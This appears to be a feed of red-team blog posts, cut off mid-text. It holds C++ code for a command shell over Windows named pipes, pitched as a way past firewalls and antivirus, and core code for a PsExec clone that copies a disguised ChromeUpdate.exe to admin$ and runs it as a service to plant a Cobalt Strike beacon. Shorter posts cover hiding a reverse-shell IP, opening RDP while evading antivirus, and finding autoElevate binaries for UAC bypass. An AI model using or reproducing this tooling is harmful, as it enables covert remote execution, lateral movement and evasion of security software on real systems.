title="服务端"></a>服务端</h4><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include&lt;Windows.h&gt;#include&lt;stdio.h&gt;#include&lt;iostream&gt;using namespace std;int main(int argc, char* argv[]) &#123;HANDLE MyServerPipe;&#x2F;&#x2F;服务端句柄 创建成功时则返回服务段端句柄char recv_buf[1024];DWORD rel_buf;&#x2F;&#x2F;https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;windows&#x2F;win32&#x2F;api&#x2F;winbase&#x2F;nf-winbase-createnamedpipea&#x2F;&#x2F;创建命名管道（管道名，管道中的数据流仅从客户端到服务器，数据作为字节流从管道中读取&amp;启用阻塞模式，管道创的最大&#x2F;&#x2F;实例数255，输出缓冲区保留字节数，输入缓冲区保留字节数，默认超时，命名管道获取默认安全描述符并且句柄不能被继承MyServerPipe &#x3D; CreateNamedPipe(&quot;\\\\.\\pipe\\serverpipe&quot;, PIPE_ACCESS_INBOUND, PIPE_READMODE_BYTE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 1024, 1024, 0, NULL);if (MyServerPipe &#x3D;&#x3D; INVALID_HANDLE_VALUE) &#123;&#x2F;&#x2F;如果失败cout &lt;&lt; &quot;create pipe fail &quot; &lt;&lt; endl;cout &lt;&lt; GetLastError() &lt;&lt; endl;CloseHandle(MyServerPipe);&#x2F;&#x2F;关闭句柄return 1;&#125;else&#123;cout &lt;&lt; &quot;create pipe success &quot; &lt;&lt; endl;&#125;&#x2F;&#x2F;允许命名管道服务器进程等待客户端连接到命名管道实例&#x2F;&#x2F;https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;windows&#x2F;win32&#x2F;api&#x2F;namedpipeapi&#x2F;nf-namedpipeapi-connectnamedpipeif (ConnectNamedPipe(MyServerPipe, NULL)) &#123;&#x2F;&#x2F;返回的服务器句柄，指向OVERLAPPED结构的指针printf(&quot;connect namepipe succcess &quot;);memset(recv_buf, 0, 1024);&#x2F;&#x2F;内存赋值if (ReadFile(MyServerPipe, recv_buf, 1024, &amp;rel_buf, NULL)) &#123;&#x2F;&#x2F;目标句柄，接收数据的缓冲区指针，读取的最大字节数，一个指向接收使用同步serverpipe参数时读取的字节数的变量的指针cout &lt;&lt; &quot;readfile success, file is :&quot; &lt;&lt; endl;cout &lt;&lt; recv_buf &lt;&lt; endl;&#125;else&#123;cout &lt;&lt; &quot;readfile fail &quot; &lt;&lt; endl;CloseHandle(MyServerPipe);return 1;&#125;&#125;CloseHandle(MyServerPipe);return  0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h4><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include&lt;Windows.h&gt;#include&lt;stdio.h&gt;#include&lt;iostream&gt;using namespace std;int main(int argc, char* argv[]) &#123;HANDLE client_pipe;char send_file[] &#x3D; &quot;yyy&quot;;DWORD rel_buf;&#x2F;&#x2F;实际字节数if (WaitNamedPipe(&quot;\\\\.\\pipe\\serverpipe&quot;, NMPWAIT_WAIT_FOREVER)) &#123;&#x2F;&#x2F;建立连接 https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;windows&#x2F;win32&#x2F;api&#x2F;winbase&#x2F;nf-winbase-waitnamedpipea&#x2F;&#x2F;NMPWAIT_WAIT_FOREVER  在命名管道的实例可用之前，该函数不会返回&#x2F;&#x2F;https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;windows&#x2F;win32&#x2F;api&#x2F;fileapi&#x2F;nf-fileapi-createfilea&#x2F;&#x2F;目标句柄，写入权限,设备共享模式（此处如果其他进程请求删除、读取或写入访问权限，则阻止它们打开文件或设备）&#x2F;&#x2F;CreateFile返回的句柄不能由应用程序可能创建的任何子进程继承,文件以外设备设定，默认值,为null即可client_pipe &#x3D; CreateFile(&quot;\\\\.\\pipe\\serverpipe&quot;, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);if (client_pipe &#x3D;&#x3D; INVALID_HANDLE_VALUE) &#123;&#x2F;&#x2F;如果失败cout &lt;&lt; &quot;open pipe fail &quot; &lt;&lt; endl;cout &lt;&lt; GetLastError() &lt;&lt; endl;CloseHandle(client_pipe);&#x2F;&#x2F;关闭句柄return 1;&#125;else&#123;cout &lt;&lt; &quot;open pipe success &quot; &lt;&lt; endl;if (WriteFile(client_pipe, send_file, 1024, &amp;rel_buf, NULL)) &#123;  &#x2F;&#x2F;https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;windows&#x2F;win32&#x2F;api&#x2F;fileapi&#x2F;nf-fileapi-writefilecout &lt;&lt; &quot;send message success&quot; &lt;&lt; endl;&#125;else &#123;cout &lt;&lt; &quot;send message fail&quot; &lt;&lt; endl;cout &lt;&lt; GetLastError() &lt;&lt; endl;CloseHandle(client_pipe);return 1;&#125;&#125;CloseHandle(client_pipe);&#125;return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="实现效果"><a href="#实现效果" class="headerlink" title="实现效果"></a>实现效果</h4><pre class="line-numbers language-none"><code class="language-none">传输客户端提供的数据效果如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MakeNamedPipe/image-20211013172952232.png" alt="image-20211013172952232"></p><h3 id="交互命令"><a href="#交互命令" class="headerlink" title="交互命令"></a>交互命令</h3><pre class="line-numbers language-none"><code class="language-none">命名管道有两种的通信模式，字节模式&amp;消息模式，在CreateNamedPipe创建命名管道时候分别用PIPE_TYPE_BYTE或者PIPE_TYPE_MESSAGE进行设置对于字节模式，信息以连续字节流的形式在客户与服务器之间流动。这也就意味着对于客户机应用和服务器应用在任何一个特定的时间段内都无法准确知道有多少字节从管道中读出或写入。在这种通信模式中，一方在向管道写入某个数量的字节后并不能保证管道的另一方能读出等量的字节对于消息模式，客户机和服务器则是通过一系列不连续的数据包进行数据的收发。从管道发出的每一条消息都必须作为一条完整的消息读入此处利用消息模式实现<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="服务端核心代码"><a href="#服务端核心代码" class="headerlink" title="服务端核心代码"></a>服务端核心代码</h4><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">while (true) &#123;&#x2F;&#x2F;读取客户端在管道写入的命令并执行命令char cmd_buf[1024 * 4];memset(cmd_buf, 0, sizeof(cmd_buf));if (!ReadFile(MyServerPipe, cmd_buf, sizeof(cmd_buf), &amp;dwRead, 0)) &#123;cout &lt;&lt; &quot;data is empty&quot; &lt;&lt; endl;break;&#125;printf(&quot;receive command : %s\n&quot;, cmd_buf);char buffer[1024 * 4];FILE* pipe &#x3D; _popen(cmd_buf, &quot;r&quot;); &#x2F;&#x2F;打开管道if (!pipe) &#123;cout &lt;&lt; &quot;openpipe fail&quot; &lt;&lt; endl;_pclose(pipe);&#125;&#x2F;&#x2F;写入到writebuf内while (!feof(pipe)) &#123;if (fgets(buffer, 4096, pipe)) &#123;strcat(write_buf, buffer);&#125;&#125;_pclose(pipe);&#x2F;&#x2F;将执行后的命令结果写入管道内，提供给客户端读取if (!WriteFile(MyServerPipe, write_buf, strlen(write_buf), &amp;dwWrite, NULL)) &#123;printf(&quot;WriteFile Failed\n&quot;);break;&#125;&#x2F;&#x2F;cout &lt;&lt; write_buf &lt;&lt; endl;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="客户端核心代码"><a href="#客户端核心代码" class="headerlink" title="客户端核心代码"></a>客户端核心代码</h4><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">while (true) &#123;cout &lt;&lt; &quot;your command : &quot; &lt;&lt; endl;cin &gt;&gt; cmd_buf;&#x2F;&#x2F;执行的命令cmd_buf[strlen(cmd_buf) + 1] &#x3D; &#39;\0&#39;;WriteFile(serverPipe, cmd_buf, strlen(cmd_buf), &amp;dwWrite, 0);printf(&quot;cmd: %s\n&quot;, cmd_buf);memset(cmd_buf, 0, 4096);&#x2F;&#x2F;命令结果ReadFile(serverPipe, data_buf, sizeof(data_buf), &amp;dwRead, 0);printf(&quot;data: %s\n&quot;, data_buf);memset(data_buf, 0, 4096);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MakeNamedPipe/image-20211102165751365.png" alt="image-20211102165751365"></p><pre class="line-numbers language-none"><code class="language-none">利用场景，当目标使用nc进行反弹shell，遭遇防火墙拦截，可尝试使用管道进行通信，常规拦截如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MakeNamedPipe/image-20211102170403019.png" alt="image-20211102170403019"></p><h3 id="实际网络通信"><a href="#实际网络通信" class="headerlink" title="实际网络通信"></a>实际网络通信</h3><pre class="line-numbers language-none"><code class="language-none">同样方式可实现网络通信，进步深入能够参照psexec原理自行构造一个命令执行的通道，命令执行如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MakeNamedPipe/image-20211102164748534.png" alt="image-20211102164748534"></p><pre class="line-numbers language-none"><code class="language-none">确认开启防火墙如下，正常无法进行反弹shell操作，常规nc杀软也会进行查杀<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MakeNamedPipe/image-20211102170547399.png" alt="image-20211102170547399"></p><pre class="line-numbers language-none"><code class="language-none">此处利用管道可获取交互shell，且防火墙不弹窗，杀软无拦截<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MakeNamedPipe/image-20211102171248002.png" alt="image-20211102171248002"></p><h3 id="数据包查看"><a href="#数据包查看" class="headerlink" title="数据包查看"></a>数据包查看</h3><pre class="line-numbers language-none"><code class="language-none">查看中间smb数据包，可发现使用命名管道进行通信<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MakeNamedPipe/image-20211102170030655.png" alt="image-20211102170030655"></p><pre class="line-numbers language-none"><code class="language-none">部分命令执行结果，数据内容并未进行加密，实战中内网数据传输可进行加密后进行传输<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/MakeNamedPipe/image-20211102170925078.png" alt="image-20211102170925078"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
            <tag> NamedPipes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实现一个仿造的Psexec</title>
      <link href="2021/11/01/shi-xian-yi-ge-fang-zao-de-psexec/"/>
      <url>2021/11/01/shi-xian-yi-ge-fang-zao-de-psexec/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><pre class="line-numbers language-none"><code class="language-none">初衷改变些许的流量特征，增强隐蔽性，此处以进行cs上线为案例，同样能够执行其他exe应用程序，未来或许将增加交互功能<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="常规痕迹"><a href="#常规痕迹" class="headerlink" title="常规痕迹"></a>常规痕迹</h2><pre class="line-numbers language-none"><code class="language-none">此处查看psexec常规日志&amp;流量中的痕迹，安全日志内登录情况如下，触发多个4624包含相关计算机名、ip、用户名等，认证为NTLMv2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/PsexecLiker/image-20211101151739612.png"></p><pre class="line-numbers language-none"><code class="language-none">部分4648日志痕迹如下，记录相关svc痕迹：<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/PsexecLiker/image-20211101152213804.png"></p><pre class="line-numbers language-none"><code class="language-none">7045提示服务被安装、7036显示服务已经启动<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/PsexecLiker/image-20211101152416505.png"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/PsexecLiker/image-20211101152428403.png"></p><pre class="line-numbers language-none"><code class="language-none">基本分析完后可得通过身份认证，创建服务从而执行目标程序，网络分析省略，可看先前发过的文章，文章内以实现后的网络流量进行分析<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="实际编写"><a href="#实际编写" class="headerlink" title="实际编写"></a>实际编写</h2><pre class="line-numbers language-none"><code class="language-none">此处效仿psexec实现相同构造利用，建立连接、复制文件、创建服务、执行程序<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="具体流量"><a href="#具体流量" class="headerlink" title="具体流量"></a>具体流量</h3><pre class="line-numbers language-none"><code class="language-none">192.168.159.149同192.168.159.143进行三次握手、协商认证方式<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/PsexecLiker/image-20211101153811115.png"></p><pre class="line-numbers language-none"><code class="language-none">向\\192.168.159.143\admin$写入改版后的程序ChromeUpdate.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/PsexecLiker/image-20211101154352640.png"></p><pre class="line-numbers language-none"><code class="language-none">利用openservicemanager来安装服务<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/PsexecLiker/image-20211101160031024.png"></p><pre class="line-numbers language-none"><code class="language-none">此处利用相仿的psexec实现cs上线<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/PsexecLiker/image-20211101162050666.png"></p><pre class="line-numbers language-none"><code class="language-none">动态效果如下19.exe 192.168.159.143 administrator Aa123456 C:\Users\Administrator\Desktop\1.exe test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/PsexecLiker/psexec1.gif"></p><h2 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h2><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">创建连接：&#x2F;&#x2F;结构示例https:&#x2F;&#x2F;docs.microsoft.com&#x2F;zh-cn&#x2F;windows&#x2F;win32&#x2F;wnet&#x2F;retrieving-information-about-a-network-resource    &#x2F;&#x2F; 用于存放SMB共享资源格式    PWCHAR lpwsIPC &#x3D; new WCHAR[MAX_PATH];    DWORD retuanval; &#x2F;&#x2F; 函数返回值    NETRESOURCE nr; &#x2F;&#x2F; 连接的详细信息 结构https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;windows&#x2F;win32&#x2F;api&#x2F;winnetwk&#x2F;ns-winnetwk-netresourcea    DWORD dwFlags &#x3D; CONNECT_UPDATE_PROFILE; &#x2F;&#x2F; 连接选项,操作系统将在用户登录时自动尝试恢复连接。    ZeroMemory(&amp;nr, sizeof(NETRESOURCE));    swprintf(lpwsIPC, L&quot;\\\\%s\\admin$&quot;, lpwsHost);&#x2F;&#x2F;连接到admin$    nr.dwType &#x3D; RESOURCETYPE_ANY; &#x2F;&#x2F; 枚举所有资源    nr.lpLocalName &#x3D; NULL;    nr.lpRemoteName &#x3D; lpwsIPC; &#x2F;&#x2F; 资源的网络名    nr.lpProvider &#x3D; NULL;    retuanval &#x3D; WNetAddConnection2(&amp;nr, lpwsPassword, lpwsUserName, dwFlags);    if (retuanval &#x3D;&#x3D; NO_ERROR) &#123;        &#x2F;&#x2F; 返回NO_ERROR则成功        wprintf(L&quot;connect success %s\n&quot;, nr.lpRemoteName);        return retuanval;    &#125;创建服务：&#x2F;&#x2F;因为WNetAddConnection2已经认证过了，所以OpenSCManager不需要认证    SC_HANDLE hSCM;&#x2F;&#x2F;服务句柄    SC_HANDLE hService;    &#x2F;&#x2F;SERVICE_STATUS service_s;    &#x2F;&#x2F; GENERIC_WRITE &#x3D; STANDARD_RIGHTS_WRITE | SC_MANAGER_CREATE_SERVICE | SC_MANAGER_MODIFY_BOOT_CONFIG    hSCM &#x3D; OpenSCManager(lpwsSCMServer, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);&#x2F;&#x2F;目标计算机名，服务控制管理器数据库的名称，服务控制管理器的访问控制权限    &#x2F;&#x2F;与指定的计算机上的服务管理器建立连接并打开指定的服务控制管理数据库    &#x2F;&#x2F;返回值成功则为指定服务控制管理器数据库的句柄，失败则为NULL    if (hSCM &#x3D;&#x3D; NULL) &#123;        cout &lt;&lt; &quot;OpenSCManager fail &quot; &lt;&lt; GetLastError() &lt;&lt; endl;        return -1;    &#125;    hService &#x3D; CreateService(&#x2F;&#x2F;https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;windows&#x2F;win32&#x2F;api&#x2F;winsvc&#x2F;nf-winsvc-createservicea&#x2F;&#x2F;创建服务对象并将其添加到指定的服务控制管理器数据库        &#x2F;&#x2F;函数成功，返回值是服务的句柄        hSCM, &#x2F;&#x2F; 服务控制管理器数据库的句柄，OpenSCManager返回          lpwsServiceName, &#x2F;&#x2F; 要安装的服务的名称        lpwsServiceName, &#x2F;&#x2F; 用户界面程序用来标识服务的显示名称        GENERIC_ALL, &#x2F;&#x2F; 访问权限        SERVICE_WIN32_OWN_PROCESS, &#x2F;&#x2F; 与一个或多个其他服务共享一个流程的服务        SERVICE_DEMAND_START, &#x2F;&#x2F; 当进程调用StartService函数时，由服务控制管理器启动的服务 。        SERVICE_ERROR_IGNORE, &#x2F;&#x2F; 启动程序将忽略该错误并继续启动操作        lpwsServicePath, &#x2F;&#x2F; 服务二进制文件的标准路径        NULL,        NULL,        NULL,        NULL,        NULL);    if (hService &#x3D;&#x3D; NULL) &#123;&#x2F;&#x2F;返回失败为null        cout &lt;&lt; &quot;CreateService fail &quot; &lt;&lt; GetLastError() &lt;&lt; endl;        return -1;    &#125;    cout &lt;&lt; &quot;create service success : &quot; &lt;&lt; lpwsServicePath &lt;&lt; endl;    hService &#x3D; OpenService(hSCM, lpwsServiceName, GENERIC_ALL);    if (hService &#x3D;&#x3D; NULL) &#123;        cout &lt;&lt; &quot;OpenService fail: &quot; &lt;&lt; GetLastError() &lt;&lt; endl;        return -1;    &#125;    cout &lt;&lt; &quot;OpenService succss&quot; &lt;&lt; endl;    StartService(hService, NULL, NULL);&#x2F;&#x2F;启动服务 https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;windows&#x2F;win32&#x2F;api&#x2F;winsvc&#x2F;nf-winsvc-startservicea    return 0;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
            <tag> Psexec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Reverse Shell Hidden Real IP</title>
      <link href="2021/10/21/linux-reverse-shell-hidden-real-ip/"/>
      <url>2021/10/21/linux-reverse-shell-hidden-real-ip/</url>
      
        <content type="html"><![CDATA[<h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">In red team, nc reverse shell is usually used with personal real IP, which is extremely easy to be traced by blue team. In order to improve the tracing cost of blue team, we try to hide the real IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="Actual-Use"><a href="#Actual-Use" class="headerlink" title="Actual Use"></a>Actual Use</h2><pre class="line-numbers language-none"><code class="language-none">Notion，you must need a public ip address The third-party traffic proxy is used to implement line forwarding. Create a new connection point as follows. The protocol type is TCP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Linux%20Reverse%20Shell%20Hidden%20Real%20IP/image-20211021162058419.png"></p><pre class="line-numbers language-none"><code class="language-none">The IP address is required when the shell is reverse. In this step, ping the domain name to obtain the real IP address :83.217.10.119<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Linux%20Reverse%20Shell%20Hidden%20Real%20IP/image-20211021162214494.png"></p><pre class="line-numbers language-none"><code class="language-none">The server is still listening to the previous port<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Linux%20Reverse%20Shell%20Hidden%20Real%20IP/image-20211021162413497.png"></p><pre class="line-numbers language-none"><code class="language-none">The target machine uses the obtained IP to reverse shell:No real IP address is displayed after you check the network connection<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Linux%20Reverse%20Shell%20Hidden%20Real%20IP/image-20211021162743009.png"></p>]]></content>
      
      
      <categories>
          
          <category> Tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Bypass </tag>
            
            <tag> Reverse Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fast Open Rdpport(BypassAV)</title>
      <link href="2021/10/12/fast-open-rdpport-bypassav/"/>
      <url>2021/10/12/fast-open-rdpport-bypassav/</url>
      
        <content type="html"><![CDATA[<h2 id="Some-of-the-words"><a href="#Some-of-the-words" class="headerlink" title="Some of the words"></a>Some of the words</h2><pre class="line-numbers language-none"><code class="language-none">Some days, I found when I open the RDPport maybe this action will be kill, Special the 360, So I develop some way to bypass AV so that I can successful open RDPport Such 360 kill like this:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Fast%20Open%20Rdpport(BypassAV)/1.png"></p><pre class="line-numbers language-none"><code class="language-none">If you want to get my tool you can go to my github, more personal tools also in my github:https:&#x2F;&#x2F;github.com&#x2F;YangSirrr&#x2F;YangsirRedTeamTools<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h2><pre class="line-numbers language-none"><code class="language-none">Actual use can bypass 360 or defender in win10, Success open rdp port like this:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Fast%20Open%20Rdpport(BypassAV)/1-1.gif"></p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Fast%20Open%20Rdpport(BypassAV)/1-2.gif"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
            <tag> RDP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Use Basic Way To BypassUAC</title>
      <link href="2021/10/09/use-basic-way-to-bypassuac/"/>
      <url>2021/10/09/use-basic-way-to-bypassuac/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><pre class="line-numbers language-none"><code class="language-none">铺垫于注册表、dll劫持利用的BypassUAC知识，使得基本原理更加简单易懂，具备手动尝试发现思路<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="UAC简介"><a href="#UAC简介" class="headerlink" title="UAC简介"></a>UAC简介</h2><pre class="line-numbers language-none"><code class="language-none">UAC（User Account Control）是微软在 Windows Vista 以后版本引入的一种安全机制，通过 UAC，应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员特别授予管理员级别的系统访问权限。UAC 可以阻止未经授权的应用程序自动进行安装，并防止无意中更改系统设置UAC需要授权的动作包括：配置Windows Update；增加或删除用户账户；改变用户的账户类型；改变UAC设置；安装ActiveX；安装或移除程序；安装设备驱动程序；设置家长控制；将文件移动或复制到Program Files或Windows目录；查看其他用户文件夹等。在触发 UAC 时，系统会创建一个consent.exe进程，该进程通过白名单程序和用户选择来判断是否创建管理员权限进程。请求进程将要请求的进程cmdline和进程路径通过LPC接口传递给appinfo的RAiLuanchAdminProcess函数，该函数首先验证路径是否在白名单中，并将结果传递给consent.exe进程，该进程验证被请求的进程签名以及发起者的权限是否符合要求，然后决定是否弹出UAC框让用户进行确认。这个UAC框会创建新的安全桌面，屏蔽之前的界面。同时这个UAC框进程是SYSTEM权限进程，其他普通进程也无法和其进行通信交互。用户确认之后，会调用CreateProcessAsUser函数以管理员权限启动请求的进程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Use%20Basic%20Way%20To%20BypassUAC/image-20210926152651279.png"></p><pre class="line-numbers language-none"><code class="language-none">权限区别：<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Use%20Basic%20Way%20To%20BypassUAC/image-20211008100323376.png"></p><pre class="line-numbers language-none"><code class="language-none">具体将表现弹窗如下<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/master/Use%20Basic%20Way%20To%20BypassUAC/image-20211008155208451.png"></p><h2 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h2><pre class="line-numbers language-none"><code class="language-none">这里主要以寻找白名单为主，主要原因一些白名单程序是会直接获取管理员权限同时不弹出UAC弹窗，这些程序拥有autoElevate属性的值为true，会在启动时就静默提升权限可考虑的关注点：程序的manifest标识的配置属性autoElevate为true程序不弹出UAC弹窗从注册表里查询Shell\Open\command键值（先前注册表bypass使用，当然不仅限于这一个值）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="实际搜索后，可能的部分白名单程序如下"><a href="#实际搜索后，可能的部分白名单程序如下" class="headerlink" title="实际搜索后，可能的部分白名单程序如下"></a>实际搜索后，可能的部分白名单程序如下</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>BitLockerWizardElev.exe:       <span class="token operator">&lt;</span>autoElevate <span class="token assign-left variable">xmlns</span><span class="token operator">=</span><span class="token string">"http://schemas.microsoft.com/SMI/2005/WindowsSettings"</span><span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>bthudtask.exe:           <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>changepk.exe:             <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>true<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>chkntfs.exe:         <span class="token operator">&lt;</span>autoElevate<span class="token operator">></span>false<span class="token operator">&lt;</span>/autoElevate<span class="token operator">></span>C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>System32<span class="token punctuation">\</span>cleanmgr.exe:         <span class="token operator">&lt;</span>autoElevate <span 